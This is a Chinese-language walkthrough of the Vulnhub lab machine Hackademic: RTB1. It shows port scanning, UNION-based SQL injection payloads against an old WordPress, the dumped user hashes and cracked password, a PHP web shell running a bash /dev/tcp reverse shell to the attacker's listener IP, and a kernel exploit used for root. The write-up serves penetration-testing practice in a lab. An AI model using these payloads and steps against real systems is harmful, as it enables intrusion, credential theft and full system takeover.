# Linux渗透实战之Hackademic: RTB1靶场提权-先知社区

> **来源**: https://xz.aliyun.com/news/16432  
> **文章ID**: 16432

---

## 0x1 前言

### 一、浅谈

哈喽师傅们，这次又到了给师傅们分享文章的时候了，这篇文章呢主要是给师傅们以vulnhub中的Hackademic: RTB1靶场，开始使用nmap进行相关渗透测试的操作，端口、目录扫描，得到一个静态的html页面，通过源代码为线索，然后挖掘wordpress的CMS框架漏洞，后面通过SQL注入，以手工和sqlmap注入来演示了SQL注入的一个过程，最后面通过爆破wordpress账户密码，去后台进行上传木马，反弹shell，再进行后面的提权操作。

### 二、靶机简介

靶机精讲之Hackademic: RTB1，vulnhub靶机，手动SQL注入，小试牛刀，内核提权。读遍牙签三万轴，欲来小邑试牛刀。

**靶机下载地址：**

<https://www.vulnhub.com/entry/hackademic-rtb1,17/>

![](images/20250102144326-de943988-c8d4-1.png)

## 0x2 信息收集

### 一、主机探测

我们首先利用arp进行主机探测，发现靶机的IP地址是10.10.10.134

```
┌──(root-kali)-[~/桌面/HackademicRTB1]
└─# arp-scan -l

```

![](images/20250102144723-6ba15ff4-c8d5-1.png)

### 二、端口扫描

利用nmap扫描靶机的端口开放情况，发现只开启了80端口，并且22端口ssh服务还被关闭了，那么目前分析，这个靶场利用找到用户名密码然后ssh远程连接的常规思路是不行了的。

```
┌──(root-kali)-[~/桌面/HackademicRTB1]
└─# nmap -sS -A -p- 10.10.10.134

```

![](images/20250102144744-783b579c-c8d5-1.png)

这将扫描目标主机的UDP协议并列出最常见的20个端口的状态，但是目前看没有发现什么有价值的端口。就目前来看，还是80端口的web服务是最为吸引我们的。

```
┌──(root-kali)-[~/桌面/HackademicRTB1]
└─# nmap -sU --top-ports 20 10.10.10.134

```

![](images/20250102144758-80a6ecc0-c8d5-1.png)

### 三、漏洞扫描

--script=vuln是nmap自带的漏洞扫描模块，我们简单的利用nmap扫描下漏洞，

也就是扫描到了几个比较老版本的漏洞，比如CVE-2007-6750、CVE-2011-3192等，但是我都上网查了下这几个漏洞的危害，都是类似ddos的让某个http网站访问不了的功能，对应我们这里渗透测试拿root权限来讲，意义不是很大，感兴趣的师傅可以尝试下。

```
┌──(root-kali)-[~/桌面/HackademicRTB1]
└─# nmap --script=vuln -p80 10.10.10.134

```

![](images/20250102144813-89c06cdc-c8d5-1.png)

## 0x3 渗透测试+信息收集

### 一、web服务信息收集

我们这里直接访问IP地址，访问这个web服务，发现是个静态的HTML页面，上面的英文意思就是让我们拿到root权限，然后拿到root目录下的key.txt文件。

![](images/20250102144903-a7a7865e-c8d5-1.png)

这里是静态的HTML页面，一般渗透测试中包括实战中，碰到都是可以右击查看网页源代码的，

目前没有发现什么有价值的信息。

![](images/20250102144917-afa008ae-c8d5-1.png)

发现这个可以点击看看

![](images/20250102144928-b6929b2c-c8d5-1.png)

然后老规矩查看网页源代码，

这次有收获，发现这个网站是个wordpress 的CMS框架网站，看着版本是1.5.1.1，应该比较低，可能存在漏洞，那么我们就可以借助Google搜素了。

发现EXP里面确实存在这个版本的wordpress漏洞，并且存在sql注入漏洞，那么我们等会多留意下存在参数的地方，然后手工测一下sql注入。

![](images/20250102144939-bd046576-c8d5-1.png)

![](images/20250102144950-c3384f16-c8d5-1.png)

![](images/20250102144957-c7754818-c8d5-1.png)

### 二、SQL注入漏洞

这个页面存在参数，我们利用单引号' 测试下，发现页面没有报错，说明不存在SQL注入

![](images/20250102145012-d07da7f2-c8d5-1.png)

#### 1、手工联合注入

1、这个页面利用单引号' 测试，页面发生了报错，并且还看到了注入语句：

```
SELECT * FROM wp_categories WHERE cat_ID = 1\\\' LIMIT 1

```

![](images/20250102145027-d9d242cc-c8d5-1.png)

2、找到了注入点，那么下一步我们就需要尝试获取数据库到底有多少列，利用order by测试。

一直到5都是页面正常，但是到6 的时候页面发生了报错，说明这个数据库就是5列

```
1 order by 1,2,3,4,5

1 order by 1,2,3,4,5,6

```

![](images/20250102145045-e4080ad8-c8d5-1.png)

![](images/20250102145056-eabed046-c8d5-1.png)

3、接下来我们可以用联合查询的方法进行注入，思考SQL查询语句，我们要保证后台执行我们的联合查询union select语句，这里使用1 发现页面没有回显，那么一般我们就要不改大要不然改小点，反正目的就是为了能有数据回显出来。我这里改成了0。

```
1 union select 1,2,3,4,5

```

![](images/20250102145116-f6c9307a-c8d5-1.png)

发现回显了个2，那么说明只有第二列才能回显

```
0 union select 1,2,3,4,5

```

![](images/20250102145134-012d6b76-c8d6-1.png)

因为大家可以看到报错的信息，后面有个LIMIT 1，说明只允许回显一列

![](images/20250102145145-07ffc854-c8d6-1.png)

4、果然没错，我们在第二列这里回显出来了数据库的版本信息以及数据库名"wordpress"

![](images/20250102145157-0f402ee2-c8d6-1.png)

![](images/20250102145205-13b468ee-c8d6-1.png)

5、那么我们接着需要报后面的更多信息，主要是要拿到比如账号密码之类的信息

这里我们直接利用Google浏览器检索下面的关键字，因为wordpress CMS框架体系非常成熟，像数据库的很多信息都是一体化的，都是可以找到对应的信息的。

但是前提是我们得找到SQL注入的报错点，然后才能进一步的利用这个漏洞。

```
wordpress database description

```

![](images/20250102145218-1b8556a0-c8d6-1.png)

找到 Table: wp\_users ，里面有关于用户的具体字段数据

![](images/20250102145229-22009346-c8d6-1.png)

6、我们直接利用group\_concat()进行读取数据库里面的字段数据，但是发现账号密码都没有分开，看着很乱，我们这里利用ASCII码的0x2d表示换行的意思，来进行数据的分开操作

```
group_concat()是一个SQL函数，通常用于将多行查询结果合并为一个字符串，以便更容易获取信息

```

![](images/20250102145243-2a542de6-c8d6-1.png)

这里需要补充一个字段就是user\_level，这里是看红队大佬的笔记

然后我们进行修改下，可以看到GeorgeMiller用户的权限是最高的，我们这里需要进行提权操作，那么肯定首选权限高的用户。

```
1-NickJames-21232f297a57a5a743894a0e4a801fc3-1
2-JohnSmith-b986448f0bb9e5e124ca91d3d650f52c-0
3-GeorgeMiller-7cbb3252ba6b7e9c422fac5334d22054-10
4-TonyBlack-a6e514f9486b83cb53d8d932f9a04292-0
5-JasonKonnors-8601f6e1028a8e8a966f6c33fcd9aec4-0
6-MaxBucky-50484c19f1afdaf3841a0d821ed393d2-0

```

![](images/20250102145256-3253f486-c8d6-1.png)

#### 2、sqlmap脚本小子

红队大佬说的是一般情况下不使用sqlmap脚本跑，除非没有任何思路了，我们使用手工联合注入可以让我们更加清楚这个底层原理，而不是为了拿到root权限当脚本小子，下面使用sqlmap跑我这里不做太多的说明，跑出数据库来即可，要是想用sqlmap的可以自己尝试下。

```
sqlmap -u "http://10.10.10.134/Hackademic_RTB1/?cat=0" --dbs --batch

```

![](images/20250102145310-3ae8b9ce-c8d6-1.png)

### 三、上传木马，反弹shell

发现密码是MD5加密的

```
┌──(root-kali)-[~/桌面/HackademicRTB1]
└─# hash-identifier "7cbb3252ba6b7e9c422fac5334d22054"

```

![](images/20250102145413-6057ed56-c8d6-1.png)

**MD5在线解密网站：**

<https://www.cmd5.org/>

解密得到密码是：q1w2e3

![](images/20250102145424-66f87f54-c8d6-1.png)

登录wordpress后台，像wordpress这种特别成熟的CMS框架，登录页面的目录位置也是固定的

/wp-login.php/目录

![](images/20250102145438-6f199a24-c8d6-1.png)

你要是不知道，其实这里扫描目录也是可以看到的

```
┌──(root-kali)-[~/桌面/HackademicRTB1]
└─# dirsearch -u http://10.10.10.134/Hackademic_RTB1/ -i 200

```

![](images/20250102145456-79db6e60-c8d6-1.png)

输入账号密码**GeorgeMiller:q1w2e3**即可登录进去了，

像这个wordpress模块的功能也是很熟悉的，因为这个CMS博客框架很普遍了，如果不了解的师傅可以搞个WP博客玩下。

像里面有好几个地方是可以进行漏洞利用的，一个是里面的插件位置，还有一个就是upload文件上传的位置，我们可以上传php木马，然后kali监听，反弹shell。

下面我带师傅们从上传php木马来演示！

![](images/20250102145513-83c232ec-c8d6-1.png)

1、首先按照下面的顺序点击如下，意思就是允许文件上传，并且允许上传php文件

![](images/20250102145525-8b70823c-c8d6-1.png)

师傅们要是看不懂，可以用Google翻译下哈，多了解下这个网站的功能点是什么意思，对我们渗透测试很有帮助的！

![](images/20250102145538-92a94926-c8d6-1.png)

**给大家推荐个写自动化脚本的网站：**

<https://www.revshells.com/>

```
/bin/bash -i >& /dev/tcp/10.10.10.128/4444 0>&1

```

![](images/20250102145552-9b644160-c8d6-1.png)

**php木马如下：**

```
<?php exec("/bin/bash -i >& /dev/tcp/10.10.10.128/4444 0>&1"); ?>

```

![](images/20250102145605-a2fcf3f4-c8d6-1.png)

![](images/20250102145612-a6e591ec-c8d6-1.png)

![](images/20250102145619-ab234592-c8d6-1.png)

然后kali进行监听，访问上面的bin.php木马

反弹shell成功了

![](images/20250102145702-c511085e-c8d6-1.png)

## 0x4 提权

### 一、基本提权+信息收集

一般进入一个用户权限的shell中，一般都会尝试下sudo提权以及SUID提权，还会看历史进程会不会有可以利用的恶意进程，以及history历史命令查看。

![](images/20250102150237-8ca19cbc-c8d7-1.png)

![](images/20250102150244-909bb672-c8d7-1.png)

### 二、内核提权

没办法了，一般基本的提权都没用，这里要拿到root权限，那么就必须得尝试下内核提权了。

很多开始学习的师傅们感觉内核提权很简单，调用别人的内核提权脚本直接编译然后执行就可以了，其实实际上并不是的，内核提权是很复杂的，因为需要你从很多脚本中进行筛选，是个细活。

需要渗透测试人员的渗透经验来进行判断。

```
bash-4.0$ uname -a
uname -a
Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux

```

我们使用searchsploit 工具进行检索过滤，发现还是有很多的脚本需要我们进行筛选

```
┌──(root-kali)-[~/桌面/HackademicRTB1]
└─# searchsploit linux kernel 2.6.3 | grep -i 'Privilege Escalation'

```

![](images/20250102150259-99e99a14-c8d7-1.png)

这里我看红队笔记大佬提出排查思路，首先排除特定linux操作系统的漏洞，比如Ubuntu/CentOS/RedHat，这些我们都暂不考虑（因为靶机操作系统不是这些），然后尽可能选择版本范围精确的漏洞。

```
searchsploit linux kernel 2.6.3 | grep -i 'Privilege Escalation' |grep -v 'Ubuntu' |grep -v 'CentOS' |grep -v 'Debian' |grep -v 'RedHat'

-v是反向查询，也就是把不需要的关键词过滤掉

```

![](images/20250102150310-a01a545a-c8d7-1.png)

其实一看还是蛮多的，这里我们先从最匹配的几个开始下手测试下，

就是10018.sh和15285.c这两个脚本。

![](images/20250102150321-a7136490-c8d7-1.png)

其中10018.sh这个脚本我先测试的，发现提权没有成功，但是第二次使用15285.c脚本测试成功提权了

我们先把脚本下载到本地，然后通过http服务上传到靶机的/tmp目录下（这个临时目录的权限比较高）

![](images/20250102150333-adcc00b2-c8d7-1.png)

编译15285.c ，然后再提高权限，然后执行改提权脚本，成功拿到root权限

```
gcc 15285.c -o 15285
chmod -R 777 15285
./15285

```

![](images/20250102150345-b56ab12e-c8d7-1.png)

### 三、成功拿到key.txt

```
sh-4.0# cat key.txt~
cat key.txt~
Yeah!!
You must be proud becouse you ve got the password to complete the First Reallistic Hackademic Challenge (Hackademic.RTB1) :)

$_d&jgQ>>ak\#b"(Hx"o<la_%

Regards,
mr.pr0n || p0wnbox.Team || 2011
http://p0wnbox.com

```

![](images/20250102150404-c04f903c-c8d7-1.png)

### 0x5 总结

这篇文章到这里就给师傅们分享完毕了，这个靶机还是蛮不错的，一个很完整的渗透测试流程展现出来了，漏洞还是蛮多的，适合大部分师傅们上手操作，本文的wp写的也蛮详细的。  
想学习红队相关操作，渗透测试到提权操作的师傅们可以下载下这个靶场，然后去实操下，这个vulnhub靶场的好处就是可以下载到本地环境，然后去操作。最后面祝愿师傅们打靶成功！
